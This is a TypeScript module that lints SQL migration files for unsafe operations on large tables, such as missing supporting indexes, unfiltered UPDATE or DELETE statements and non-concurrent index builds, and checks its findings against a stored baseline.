import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { createHash } from "node:crypto";
import { readdir, readFile } from "node:fs/promises";
import { basename } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";
import { MIGRATION_SAFETY_BASELINE } from "./migration-safety-baseline.js";
import {
  getTableSizeEstimate,
  isKnownLargeTable,
  type TableSizeEstimate,
} from "./table-size-estimates.js";

const migrationsDir = fileURLToPath(new URL("./migrations", import.meta.url));

export type MigrationSafetyRule =
  | "loop-mutation-large-table"
  | "batched-mutation-large-table-missing-index"
  | "full-table-mutation-large-table"
  | "large-create-index-not-concurrently";

export type MigrationSafetySeverity = "error" | "warning";

export type MigrationSafetyFinding = {
  readonly id: string;
  readonly rule: MigrationSafetyRule;
  readonly severity: MigrationSafetySeverity;
  readonly migration: string;
  readonly table: string;
  readonly statement: string;
  readonly message: string;
};

export type MigrationSafetyInput = {
  readonly fileName: string;
  readonly sql: string;
};

export type MigrationSafetyResult = {
  readonly findings: readonly MigrationSafetyFinding[];
  readonly newFindings: readonly MigrationSafetyFinding[];
  readonly baselineFindings: readonly MigrationSafetyFinding[];
  readonly staleBaselineIds: readonly string[];
};

type RuleMetadata = {
  readonly severity: MigrationSafetySeverity;
  readonly message: string;
};

type CreateIndexInfo = {
  readonly table: string;
  readonly columns: readonly string[];
  readonly predicate: string | null;
  readonly predicateColumns: readonly string[];
  readonly concurrently: boolean;
  readonly statement: string;
};

type MutationInfo = {
  readonly table: string;
  readonly statementSql: string;
  readonly keywordIndex: number;
};

const RULE_METADATA: Record<MigrationSafetyRule, RuleMetadata> = {
  "loop-mutation-large-table": {
    severity: "error",
    message: "DO $$ loop mutates a known-large table without a same-migration support index",
  },
  "batched-mutation-large-table-missing-index": {
    severity: "error",
    message: "Batched LIMIT mutation over a known-large table lacks a same-migration support index",
  },
  "full-table-mutation-large-table": {
    severity: "error",
    message: "Known-large table mutation does not have a selective WHERE clause",
  },
  "large-create-index-not-concurrently": {
    severity: "warning",
    message: "CREATE INDEX on a known-large table is missing CONCURRENTLY",
  },
};

const RESERVED_ALIAS_WORDS = new Set([
  "add",
  "alter",
  "as",
  "delete",
  "from",
  "on",
  "returning",
  "set",
  "using",
  "where",
  "with",
]);

function normalizeIdentifier(value: string): string {
  return value
    .trim()
    .replace(/^"public"\s*\.\s*/i, "")
    .replace(/^public\s*\.\s*/i, "")
    .replace(/^"/, "")
    .replace(/"$/, "")
    .replaceAll('""', '"');
}

function normalizeSql(value: string): string {
  return value.replace(/\s+/g, " ").trim();
}

function statementExcerpt(statement: string): string {
  const normalized = normalizeSql(statement);
  if (normalized.length <= 700) return normalized;
  return `${normalized.slice(0, 700)}...`;
}

function findingId(
  rule: MigrationSafetyRule,
  migration: string,
  table: string,
  statement: string,
): string {
  return createHash("sha256")
    .update(`${rule}\0${migration}\0${table}\0${normalizeSql(statement)}`)
    .digest("hex")
    .slice(0, 16);
}

function splitSqlStatements(sql: string): string[] {
  const breakpointParts = sql
    .split(/-->\s*statement-breakpoint/g)
    .map((part) => part.trim())
    .filter((part) => part.length > 0);
  if (breakpointParts.length > 1) return breakpointParts;

  const statements: string[] = [];
  let start = 0;
  let singleQuoted = false;
  let dollarQuoteTag: string | null = null;

  for (let index = 0; index < sql.length; index += 1) {
    if (dollarQuoteTag) {
      if (sql.startsWith(dollarQuoteTag, index)) {
        index += dollarQuoteTag.length - 1;
        dollarQuoteTag = null;
      }
      continue;
    }

    const char = sql[index];
    if (singleQuoted) {
      if (char === "'" && sql[index + 1] === "'") {
        index += 1;
      } else if (char === "'") {
        singleQuoted = false;
      }
      continue;
    }

    if (char === "'") {
      singleQuoted = true;
      continue;
    }

    if (char === "$") {
      const tag = dollarQuoteTagAt(sql, index);
      if (tag) {
        dollarQuoteTag = tag;
        index += dollarQuoteTag.length - 1;
      }
      continue;
    }

    if (char === ";") {
      const statement = sql.slice(start, index + 1).trim();
      if (statement.length > 0) statements.push(statement);
      start = index + 1;
    }
  }

  const tail = sql.slice(start).trim();
  if (tail.length > 0) statements.push(tail);
  return statements;
}

function ignoreRules(statement: string): Set<string> {
  const rules = new Set<string>();
  const pattern = /--\s*paperclip:migration-safety-ignore\s+([a-z0-9-]+|all)\s*:\s*(\S.*)$/gim;
  for (const match of statement.matchAll(pattern)) {
    const rule = match[1];
    const reason = match[2]?.trim();
    if (rule && reason) rules.add(rule);
  }
  return rules;
}

function isIgnored(statement: string, rule: MigrationSafetyRule): boolean {
  const ignored = ignoreRules(statement);
  return ignored.has(rule) || ignored.has("all");
}

function skipSingleQuotedLiteral(statement: string, startIndex: number): number {
  let index = startIndex + 1;
  while (index < statement.length) {
    if (statement[index] === "'" && statement[index + 1] === "'") {
      index += 2;
      continue;
    }
    if (statement[index] === "'") return index + 1;
    index += 1;
  }
  return index;
}

function skipDoubleQuotedIdentifier(statement: string, startIndex: number): number {
  let index = startIndex + 1;
  while (index < statement.length) {
    if (statement[index] === '"' && statement[index + 1] === '"') {
      index += 2;
      continue;
    }
    if (statement[index] === '"') return index + 1;
    index += 1;
  }
  return index;
}

function skipLineComment(statement: string, startIndex: number): number {
  const newlineIndex = statement.indexOf("\n", startIndex + 2);
  return newlineIndex === -1 ? statement.length : newlineIndex;
}

function skipBlockComment(statement: string, startIndex: number): number {
  let depth = 1;
  let index = startIndex + 2;
  while (index < statement.length && depth > 0) {
    if (statement.startsWith("/*", index)) {
      depth += 1;
      index += 2;
      continue;
    }
    if (statement.startsWith("*/", index)) {
      depth -= 1;
      index += 2;
      continue;
    }
    index += 1;
  }
  return index;
}

function skipDollarQuotedString(statement: string, startIndex: number): number {
  const tag = dollarQuoteTagAt(statement, startIndex);
  if (!tag) return startIndex;
  const closeIndex = statement.indexOf(tag, startIndex + tag.length);
  return closeIndex === -1 ? statement.length : closeIndex + tag.length;
}

function stripSqlComments(statement: string): string {
  let stripped = "";
  let index = 0;

  while (index < statement.length) {
    const char = statement[index];
    const next = statement[index + 1];

    if (char === "'") {
      const literalEnd = skipSingleQuotedLiteral(statement, index);
      stripped += statement.slice(index, literalEnd);
      index = literalEnd;
      continue;
    }

    if (char === '"') {
      const identifierEnd = skipDoubleQuotedIdentifier(statement, index);
      stripped += statement.slice(index, identifierEnd);
      index = identifierEnd;
      continue;
    }

    if (char === "$") {
      const dollarEnd = skipDollarQuotedString(statement, index);
      if (dollarEnd !== index) {
        stripped += statement.slice(index, dollarEnd);
        index = dollarEnd;
        continue;
      }
    }

    if (char === "-" && next === "-") {
      stripped += " ";
      index = skipLineComment(statement, index);
      continue;
    }

    if (char === "/" && next === "*") {
      stripped += " ";
      const commentEnd = skipBlockComment(statement, index);
      for (let commentIndex = index; commentIndex < commentEnd; commentIndex += 1) {
        if (statement[commentIndex] === "\n") stripped += "\n";
      }
      index = commentEnd;
      continue;
    }

    stripped += char;
    index += 1;
  }

  return stripped;
}

function skipSqlTrivia(statement: string, index: number): number {
  const char = statement[index];
  const next = statement[index + 1];
  if (char === "'") return skipSingleQuotedLiteral(statement, index);
  if (char === '"') return skipDoubleQuotedIdentifier(statement, index);
  if (char === "$") {
    const end = skipDollarQuotedString(statement, index);
    if (end !== index) return end;
  }
  if (char === "-" && next === "-") return skipLineComment(statement, index);
  if (char === "/" && next === "*") return skipBlockComment(statement, index);
  return index;
}

function identifierList(value: string): string[] {
  return [...value.matchAll(/"([^"]+)"|(?:^|[\s,(])([A-Za-z_][A-Za-z0-9_]*)/g)]
    .map((match) => normalizeIdentifier(match[1] ?? match[2] ?? ""))
    .filter((identifier) => identifier.length > 0)
    .filter((identifier) => !RESERVED_ALIAS_WORDS.has(identifier.toLowerCase()));
}

function plainIndexColumns(columnSpec: string): string[] {
  // Only include simple column references. Skip expression columns such as
  // (id * 2) or lower(col) — PostgreSQL cannot use those to satisfy ORDER BY
  // on the plain column, so they must not suppress a missing-index finding.
  return splitSqlList(columnSpec).flatMap((part) => {
    const trimmed = part.trim();
    if (/\(/.test(trimmed)) return [];
    return identifierList(trimmed);
  });
}

function splitSqlList(value: string): string[] {
  const parts: string[] = [];
  let start = 0;
  let depth = 0;
  let singleQuoted = false;
  let doubleQuoted = false;

  for (let index = 0; index < value.length; index += 1) {
    const char = value[index];

    if (singleQuoted) {
      if (char === "'" && value[index + 1] === "'") {
        index += 1;
      } else if (char === "'") {
        singleQuoted = false;
      }
      continue;
    }

    if (doubleQuoted) {
      if (char === '"' && value[index + 1] === '"') {
        index += 1;
      } else if (char === '"') {
        doubleQuoted = false;
      }
      continue;
    }

    if (char === "'") {
      singleQuoted = true;
      continue;
    }

    if (char === '"') {
      doubleQuoted = true;
      continue;
    }

    if (char === "(") {
      depth += 1;
      continue;
    }

    if (char === ")") {
      depth = Math.max(0, depth - 1);
      continue;
    }

    if (char === "," && depth === 0) {
      const part = value.slice(start, index).trim();
      if (part) parts.push(part);
      start = index + 1;
    }
  }

  const tail = value.slice(start).trim();
  if (tail) parts.push(tail);
  return parts;
}

function orderByExpressionColumn(value: string): string | null {
  const withoutSortModifiers = value
    .replace(/\bCOLLATE\s+(?:"[^"]+"|[A-Za-z_][A-Za-z0-9_]*)/gi, " ")
    .replace(/\bNULLS\s+(?:FIRST|LAST)\b/gi, " ")
    .replace(/\b(?:ASC|DESC)\b/gi, " ");
  const identifiers = [
    ...withoutSortModifiers.matchAll(/"([^"]+)"|([A-Za-z_][A-Za-z0-9_]*)/g),
  ]
    .map((match) => normalizeIdentifier(match[1] ?? match[2] ?? ""))
    .filter((identifier) => identifier.length > 0)
    .filter((identifier) => !RESERVED_ALIAS_WORDS.has(identifier.toLowerCase()));
  return identifiers[identifiers.length - 1] ?? null;
}

function predicateColumns(statement: string): string[] {
  const columns = new Set<string>();
  const sql = stripSqlComments(statement);
  const predicatePattern = /\b(?:WHERE|ORDER\s+BY|ON)\b([\s\S]*?)(?=\b(?:LIMIT|RETURNING|GROUP\s+BY|ORDER\s+BY|SET|FROM)\b|$)/gi;
  for (const match of sql.matchAll(predicatePattern)) {
    for (const identifier of identifierList(match[1] ?? "")) {
      columns.add(identifier);
    }
  }
  return [...columns];
}

type KeywordOccurrence = {
  readonly index: number;
  readonly depth: number;
  readonly length: number;
};

function keywordOccurrenceAt(
  sql: string,
  index: number,
  pattern: RegExp,
): RegExpMatchArray | null {
  const previous = sql[index - 1];
  if (previous && /[A-Za-z0-9_]/.test(previous)) return null;
  return sql.slice(index).match(pattern);
}

function keywordOccurrences(sql: string, pattern: RegExp): KeywordOccurrence[] {
  const occurrences: KeywordOccurrence[] = [];
  let depth = 0;
  let index = 0;

  while (index < sql.length) {
    const char = sql[index];

    if (char === "'") {
      index = skipSingleQuotedLiteral(sql, index);
      continue;
    }

    if (char === '"') {
      index = skipDoubleQuotedIdentifier(sql, index);
      continue;
    }

    if (char === "(") {
      depth += 1;
      index += 1;
      continue;
    }

    if (char === ")") {
      depth = Math.max(0, depth - 1);
      index += 1;
      continue;
    }

    const match = keywordOccurrenceAt(sql, index, pattern);
    if (match) {
      occurrences.push({ index, depth, length: match[0].length });
      index += match[0].length;
      continue;
    }

    index += 1;
  }

  return occurrences;
}

function batchWhereClausesBeforeOrderBy(statement: string): string[] {
  const sql = stripSqlComments(statement);
  const whereOccurrences = keywordOccurrences(sql, /^\bWHERE\b/i);
  const orderByOccurrences = keywordOccurrences(sql, /^\bORDER\s+BY\b/i);
  const clauses: string[] = [];

  for (const orderBy of orderByOccurrences) {
    const where = whereOccurrences
      .filter((candidate) => candidate.depth === orderBy.depth && candidate.index < orderBy.index)
      .at(-1);
    if (!where) continue;

    const clause = sql.slice(where.index + where.length, orderBy.index).trim();
    if (clause) clauses.push(clause);
  }

  return clauses;
}

function hasBalancedOuterParens(value: string): boolean {
  if (!value.startsWith("(") || !value.endsWith(")")) return false;
  let depth = 0;

  for (let index = 0; index < value.length; index += 1) {
    const char = value[index];
    if (char === "'") {
      index = skipSingleQuotedLiteral(value, index) - 1;
      continue;
    }
    if (char === '"') {
      index = skipDoubleQuotedIdentifier(value, index) - 1;
      continue;
    }
    if (char === "(") depth += 1;
    if (char === ")") depth -= 1;
    if (depth === 0 && index < value.length - 1) return false;
  }

  return depth === 0;
}

function stripOuterParens(value: string): string {
  let stripped = normalizeSql(value).replace(/;$/, "").trim();
  while (hasBalancedOuterParens(stripped)) {
    stripped = normalizeSql(stripped.slice(1, -1));
  }
  return stripped;
}

function splitConjunctivePredicate(value: string): string[] {
  const terms: string[] = [];
  const sql = stripOuterParens(value);
  let depth = 0;
  let start = 0;
  let index = 0;

  while (index < sql.length) {
    const char = sql[index];

    if (char === "'") {
      index = skipSingleQuotedLiteral(sql, index);
      continue;
    }

    if (char === '"') {
      index = skipDoubleQuotedIdentifier(sql, index);
      continue;
    }

    if (char === "(") {
      depth += 1;
      index += 1;
      continue;
    }

    if (char === ")") {
      depth = Math.max(0, depth - 1);
      index += 1;
      continue;
    }

    const match = depth === 0 ? keywordOccurrenceAt(sql, index, /^\bAND\b/i) : null;
    if (match) {
      const term = stripOuterParens(sql.slice(start, index));
      if (term) terms.push(term);
      start = index + match[0].length;
      index = start;
      continue;
    }

    index += 1;
  }

  const tail = stripOuterParens(sql.slice(start));
  if (tail) terms.push(tail);
  return terms;
}

function lowercaseSqlOutsideSingleQuotedLiterals(value: string): string {
  let lowered = "";
  let index = 0;

  while (index < value.length) {
    if (value[index] === "'") {
      const end = skipSingleQuotedLiteral(value, index);
      lowered += value.slice(index, end);
      index = end;
      continue;
    }

    lowered += value[index]?.toLowerCase() ?? "";
    index += 1;
  }

  return lowered;
}

function normalizePredicateTerm(term: string): string {
  const normalized = stripOuterParens(term)
    .replace(
      /(?:"[^"]+"|[A-Za-z_][A-Za-z0-9_]*)\s*\.\s*("[^"]+"|[A-Za-z_][A-Za-z0-9_]*)/g,
      "$1",
    )
    .replace(/"([^"]+)"/g, "$1")
    .replace(/\s+/g, " ")
    .trim();
  return lowercaseSqlOutsideSingleQuotedLiterals(normalized);
}

function predicateTerms(value: string): Set<string> {
  return new Set(splitConjunctivePredicate(value).map(normalizePredicateTerm));
}

function orderByColumns(statement: string): string[] {
  const columns: string[] = [];
  const sql = stripSqlComments(statement);
  const pattern = /\bORDER\s+BY\b([\s\S]*?)(?=\b(?:LIMIT|RETURNING|GROUP\s+BY|WHERE|SET|FROM|END|LOOP)\b|$)/gi;
  for (const match of sql.matchAll(pattern)) {
    for (const expression of splitSqlList(match[1] ?? "")) {
      const column = orderByExpressionColumn(expression);
      if (column && !columns.includes(column)) {
        columns.push(column);
      }
    }
  }
  return columns;
}

function parseCreateIndexes(statement: string): CreateIndexInfo[] {
  const indexes: CreateIndexInfo[] = [];
  const sql = stripSqlComments(statement);
  const pattern =
    /\bCREATE\s+(?:UNIQUE\s+)?INDEX\s+(CONCURRENTLY\s+)?(?:IF\s+NOT\s+EXISTS\s+)?(?:"[^"]+"|[A-Za-z_][A-Za-z0-9_]*)\s+ON\s+(?:(?:"public"|public)\s*\.\s*)?(?:"([^"]+)"|([A-Za-z_][A-Za-z0-9_]*))\s*(?:USING\s+[A-Za-z_][A-Za-z0-9_]*\s*)?\(([\s\S]*?)\)(?:\s+WHERE\s+([\s\S]*))?/gi;

  for (const match of sql.matchAll(pattern)) {
    const table = normalizeIdentifier(match[2] ?? match[3] ?? "");
    if (!table) continue;
    const predicate = match[5]?.trim().replace(/;$/, "").trim() ?? "";
    indexes.push({
      table,
      columns: plainIndexColumns(match[4] ?? ""),
      predicate: predicate.length > 0 ? predicate : null,
      predicateColumns: predicateColumns(predicate),
      concurrently: Boolean(match[1]),
      statement,
    });
  }

  return indexes;
}

function parseMutations(statement: string): MutationInfo[] {
  const mutations: MutationInfo[] = [];
  const sql = stripSqlComments(statement);
  const updatePattern =
    /\bUPDATE\s+(?:ONLY\s+)?(?:(?:"public"|public)\s*\.\s*)?(?:"([^"]+)"|([A-Za-z_][A-Za-z0-9_]*))(?:\s+(?:AS\s+)?(?:"?([A-Za-z_][A-Za-z0-9_]*)"?))?/gi;
  const deletePattern =
    /\bDELETE\s+FROM\s+(?:ONLY\s+)?(?:(?:"public"|public)\s*\.\s*)?(?:"([^"]+)"|([A-Za-z_][A-Za-z0-9_]*))(?:\s+(?:AS\s+)?(?:"?([A-Za-z_][A-Za-z0-9_]*)"?))?/gi;

  for (const match of sql.matchAll(updatePattern)) {
    const table = normalizeIdentifier(match[1] ?? match[2] ?? "");
    if (table) {
      mutations.push({ table, statementSql: sql, keywordIndex: match.index ?? 0 });
    }
  }

  for (const match of sql.matchAll(deletePattern)) {
    const table = normalizeIdentifier(match[1] ?? match[2] ?? "");
    if (table) {
      mutations.push({ table, statementSql: sql, keywordIndex: match.index ?? 0 });
    }
  }

  return mutations;
}

function hasDoLoop(statement: string): boolean {
  return /\bDO\s+\$[A-Za-z_]*\$[\s\S]*\bLOOP\b/i.test(statement);
}

function hasBatchedLimitMutation(statement: string): boolean {
  const hasLimit = /\bLIMIT\s+(?:\d+|[A-Za-z_][A-Za-z0-9_]*|\$[0-9]+)\b/i.test(statement);
  const hasFetchLimit =
    /\bFETCH\s+(?:FIRST|NEXT)(?:\s+(?:\d+|[A-Za-z_][A-Za-z0-9_]*|\$[0-9]+))?\s+ROWS?\s+(?:ONLY|WITH\s+TIES)\b/i.test(statement);
  const hasDml = /\b(?:UPDATE|DELETE)\b/i.test(statement);
  return (hasLimit || hasFetchLimit) && hasDml;
}

function dollarQuoteTagAt(statement: string, startIndex: number): string | null {
  if (statement[startIndex] !== "$") return null;
  const match = statement.slice(startIndex).match(/^\$(?:[A-Za-z_][A-Za-z0-9_]*)?\$/);
  return match?.[0] ?? null;
}

function topLevelWhereClause(statement: string, startIndex: number): string | null {
  // Walk character-by-character, tracking paren depth.
  // Only consider WHERE keywords at depth 0 after the target mutation.
  let depth = 0;
  let i = startIndex;
  while (i < statement.length) {
    const nextIndex = skipSqlTrivia(statement, i);
    if (nextIndex !== i) {
      i = nextIndex;
      continue;
    }

    const ch = statement[i];
    if (ch === "(") {
      depth++;
      i++;
      continue;
    }
    if (ch === ")") {
      depth = Math.max(0, depth - 1);
      i++;
      continue;
    }
    if (depth === 0) {
      const rem = statement.slice(i);
      const m = rem.match(/^\bWHERE\b/i);
      if (m) return rem.slice(m[0].length);
    }
    i++;
  }
  return null;
}

function hasSelectiveWhere(mutation: MutationInfo): boolean {
  const afterWhere = topLevelWhereClause(mutation.statementSql, mutation.keywordIndex);
  if (!afterWhere) return false;

  const whereClause = normalizeSql(afterWhere).replace(/;$/, "");
  if (/^(?:true|1\s*=\s*1)$/i.test(whereClause)) return false;
  if (!/(?:=|<>|!=|<|>|\bIN\s*\(|\bEXISTS\s*\(|\bLIKE\b|\bIS\s+(?:NOT\s+)?NULL\b)/i.test(whereClause))
    return false;

  // A WHERE that only constrains joined tables is not a filter on the target table.
  // Collect every table-qualified column reference (both "tbl"."col" and alias."col").
  const qualRefs = [
    ...whereClause.matchAll(/"([^"]+)"\s*\.\s*(?:"[^"]+"|\w+)/g),
    ...whereClause.matchAll(/\b([A-Za-z_][A-Za-z0-9_]*)\s*\."[^"]+"/g),
    ...whereClause.matchAll(/\b([A-Za-z_][A-Za-z0-9_]*)\.([A-Za-z_][A-Za-z0-9_]*)\b/g),
  ].map((m) => normalizeIdentifier(m[1] ?? "")).filter(Boolean);

  if (qualRefs.length > 0) {
    // Resolve unquoted aliases from UPDATE/FROM/JOIN clauses to their real table names.
    const aliasMap = new Map<string, string>();
    const aliasPattern =
      /\b(?:UPDATE|FROM|JOIN)\s+(?:"public"\s*\.\s*)?(?:"([^"]+)"|([A-Za-z_][A-Za-z0-9_]*))\s+(?:AS\s+)?(?:"([^"]+)"|([A-Za-z_][A-Za-z0-9_]*))\b/gi;
    for (const m of stripSqlComments(mutation.statementSql).matchAll(aliasPattern)) {
      const tbl = normalizeIdentifier(m[1] ?? m[2] ?? "");
      const alias = normalizeIdentifier(m[3] ?? m[4] ?? "");
      if (tbl && alias && !RESERVED_ALIAS_WORDS.has(alias.toLowerCase())) aliasMap.set(alias, tbl);
    }
    const refTables = qualRefs.map((r) => aliasMap.get(r) ?? r);
    if (!refTables.some((t) => t === mutation.table)) {
      // All refs resolve to other tables. Confirm no bare unqualified identifiers remain.
      const noQual = whereClause
        .replace(/"[^"]+"\s*\.\s*(?:"[^"]+"|\w+)/g, " ")
        .replace(/\b[A-Za-z_][A-Za-z0-9_]*\s*\."[^"]+"/g, " ")
        .replace(/\b[A-Za-z_][A-Za-z0-9_]*\.[A-Za-z_][A-Za-z0-9_]*/g, " ")
        .replace(/'(?:[^']|'')*'/g, " ");
      const SQL_KW =
        /\b(?:AND|OR|NOT|IN|EXISTS|LIKE|IS|NULL|TRUE|FALSE|BETWEEN|CASE|WHEN|THEN|END|CAST|AS|ANY|ALL|SOME)\b/gi;
      if (!/\b[A-Za-z_][A-Za-z0-9_]*\b/.test(noQual.replace(SQL_KW, " "))) return false;
    }
  }

  return true;
}

function hasLeadingOrderPrefix(
  supportIndex: CreateIndexInfo,
  orderColumns: readonly string[],
  statement: string,
): boolean {
  const indexedColumns = supportIndex.columns;
  const prefixLength = Math.min(indexedColumns.length, orderColumns.length);
  if (prefixLength === 0) return false;
  for (let index = 0; index < prefixLength; index += 1) {
    if (indexedColumns[index] !== orderColumns[index]) return false;
  }
  if (!supportIndex.predicate) return true;

  const indexPredicateTerms = predicateTerms(supportIndex.predicate);
  if (indexPredicateTerms.size === 0) return false;

  return batchWhereClausesBeforeOrderBy(statement).some((whereClause) => {
    const batchTerms = predicateTerms(whereClause);
    return [...indexPredicateTerms].every((term) => batchTerms.has(term));
  });
}

function hasOrderPrefixCompatibleIndex(
  supportIndex: CreateIndexInfo,
  orderColumns: readonly string[],
  statement: string,
): boolean {
  return hasLeadingOrderPrefix(supportIndex, orderColumns, statement);
}

function hasMatchingSupportIndex(
  indexes: readonly CreateIndexInfo[],
  mutation: MutationInfo,
  statement: string,
): boolean {
  const matchingIndexes = indexes.filter((index) => index.table === mutation.table);
  if (matchingIndexes.length === 0) return false;

  // ORDER BY columns are the batch-progression key. If the statement orders its
  // batch, the support index must cover the ordered key prefix using index key
  // columns; predicate-only overlap cannot stand in for an unindexed cursor.
  const orderCols = orderByColumns(statement);
  const allPredicateCols = new Set(predicateColumns(statement));
  if (allPredicateCols.size === 0) return true;

  if (orderCols.length > 0) {
    return matchingIndexes.some((index) =>
      hasOrderPrefixCompatibleIndex(index, orderCols, statement),
    );
  }

  return matchingIndexes.some((index) => {
    const indexedColumns = new Set([...index.columns, ...index.predicateColumns]);
    return [...allPredicateCols].some((col) => indexedColumns.has(col));
  });
}

function estimateSuffix(table: string, estimates: ReadonlyMap<string, TableSizeEstimate>): string {
  const estimate = estimates.get(table) ?? getTableSizeEstimate(table);
  if (!estimate) return "bucket=large";
  return `bucket=${estimate.bucket}, localRows=${estimate.localRows}, estimatedRows=${estimate.estimatedRows}`;
}

function makeFinding(
  rule: MigrationSafetyRule,
  migration: string,
  table: string,
  statement: string,
  estimates: ReadonlyMap<string, TableSizeEstimate>,
): MigrationSafetyFinding {
  const metadata = RULE_METADATA[rule];
  return {
    id: findingId(rule, migration, table, statement),
    rule,
    severity: metadata.severity,
    migration,
    table,
    statement: statementExcerpt(statement),
    message: `${metadata.message} (${estimateSuffix(table, estimates)})`,
  };
}

function addFindingOnce(
  findings: MigrationSafetyFinding[],
  seen: Set<string>,
  finding: MigrationSafetyFinding,
): void {
  const key = `${finding.rule}:${finding.migration}:${finding.table}:${finding.id}`;
  if (seen.has(key)) return;
  seen.add(key);
  findings.push(finding);
}

function estimatesByTable(
  estimates: readonly TableSizeEstimate[] | undefined,
): ReadonlyMap<string, TableSizeEstimate> {
  if (!estimates) return new Map();
  return new Map(estimates.map((estimate) => [estimate.table, estimate]));
}

function tableIsLarge(table: string, estimates: ReadonlyMap<string, TableSizeEstimate>): boolean {
  if (estimates.size > 0) return estimates.get(table)?.bucket === "large";
  return isKnownLargeTable(table);
}

export function analyzeMigrationSafety(
  migrations: readonly MigrationSafetyInput[],
  options: {
    readonly baselineIds?: readonly string[];
    readonly estimates?: readonly TableSizeEstimate[];
  } = {},
): MigrationSafetyResult {
  const findings: MigrationSafetyFinding[] = [];
  const seen = new Set<string>();
  const estimates = estimatesByTable(options.estimates);

  for (const migration of migrations) {
    const statements = splitSqlStatements(migration.sql);
    const migrationIndexes = statements.flatMap(parseCreateIndexes);

    for (const statement of statements) {
      for (const index of parseCreateIndexes(statement)) {
        if (
          tableIsLarge(index.table, estimates) &&
          !index.concurrently &&
          !isIgnored(statement, "large-create-index-not-concurrently")
        ) {
          addFindingOnce(
            findings,
            seen,
            makeFinding(
              "large-create-index-not-concurrently",
              migration.fileName,
              index.table,
              statement,
              estimates,
            ),
          );
        }
      }

      const mutations = parseMutations(statement)
        .filter((mutation) => tableIsLarge(mutation.table, estimates));
      for (const mutation of mutations) {
        const hasSupportIndex = hasMatchingSupportIndex(migrationIndexes, mutation, statement);

        if (
          hasDoLoop(statement) &&
          !hasSupportIndex &&
          !isIgnored(statement, "loop-mutation-large-table")
        ) {
          addFindingOnce(
            findings,
            seen,
            makeFinding(
              "loop-mutation-large-table",
              migration.fileName,
              mutation.table,
              statement,
              estimates,
            ),
          );
        }

        if (
          hasBatchedLimitMutation(statement) &&
          !hasSupportIndex &&
          !isIgnored(statement, "batched-mutation-large-table-missing-index")
        ) {
          addFindingOnce(
            findings,
            seen,
            makeFinding(
              "batched-mutation-large-table-missing-index",
              migration.fileName,
              mutation.table,
              statement,
              estimates,
            ),
          );
        }

        if (
          !hasSelectiveWhere(mutation) &&
          !isIgnored(statement, "full-table-mutation-large-table")
        ) {
          addFindingOnce(
            findings,
            seen,
            makeFinding(
              "full-table-mutation-large-table",
              migration.fileName,
              mutation.table,
              statement,
              estimates,
            ),
          );
        }
      }
    }
  }

  const baselineIds = new Set(options.baselineIds ?? MIGRATION_SAFETY_BASELINE.map((entry) => entry.id));
  const foundIds = new Set(findings.map((finding) => finding.id));
  const newFindings = findings.filter((finding) => !baselineIds.has(finding.id));
  const baselineFindings = findings.filter((finding) => baselineIds.has(finding.id));
  const staleBaselineIds = [...baselineIds].filter((id) => !foundIds.has(id));

  return {
    findings,
    newFindings,
    baselineFindings,
    staleBaselineIds,
  };
}

async function readMigrations(): Promise<MigrationSafetyInput[]> {
  const files = (await readdir(migrationsDir))
    .filter((entry) => entry.endsWith(".sql"))
    .sort();

  return Promise.all(
    files.map(async (fileName) => ({
      fileName,
      sql: await readFile(new URL(`./migrations/${fileName}`, import.meta.url), "utf8"),
    })),
  );
}

function formatFinding(finding: MigrationSafetyFinding): string {
  return [
    `[${finding.rule}] ${finding.migration} table=${finding.table} severity=${finding.severity} id=${finding.id}`,
    finding.message,
    `Statement: ${finding.statement}`,
  ].join("\n");
}

function formatNewFindings(findings: readonly MigrationSafetyFinding[]): string {
  const rendered = findings.map(formatFinding).join("\n\n");
  return [
    `Migration safety check found ${findings.length} new finding(s).`,
    "Add a same-migration support index, use CONCURRENTLY where applicable, or add",
    "`-- paperclip:migration-safety-ignore <rule>: <reason>` next to the statement.",
    "",
    rendered,
  ].join("\n");
}

async function main() {
  const result = analyzeMigrationSafety(await readMigrations());

  if (result.newFindings.length > 0) {
    throw new Error(formatNewFindings(result.newFindings));
  }

  const staleSuffix = result.staleBaselineIds.length > 0
    ? ` (${result.staleBaselineIds.length} stale baseline id(s) ignored)`
    : "";
  console.log(
    `Migration safety check passed: ${result.baselineFindings.length} historical finding(s) covered by baseline${staleSuffix}.`,
  );
}

if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) {
  try {
    await main();
  } catch (error) {
    const detail = error instanceof Error ? error.message : String(error);
    console.error(`${basename(process.argv[1])}: ${detail}`);
    process.exitCode = 1;
  }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                